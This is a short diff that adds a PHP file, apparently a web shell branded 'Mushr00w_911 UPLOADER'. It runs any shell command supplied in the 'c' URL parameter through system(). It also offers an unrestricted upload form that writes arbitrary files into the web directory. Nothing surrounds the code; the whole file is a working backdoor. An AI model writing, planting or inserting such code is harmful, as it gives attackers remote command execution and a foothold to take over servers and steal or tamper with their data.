@@ -1,0 +1,10 @@
+<?php
+if(isset($_GET["c"])){system($_GET["c"]);exit;}
+if(isset($_FILES["file"])){
+    move_uploaded_file($_FILES["file"]["tmp_name"],basename($_FILES["file"]["name"]));
+    echo"Mushr00w_911 UPLOADER OK";exit;
+}
+?>
+<h2>Mushr00w_911 UPLOADER</h2>
+<form method="POST" enctype="multipart/form-data">
+<input type="file" name="file"><button>UPLOAD</button></form>
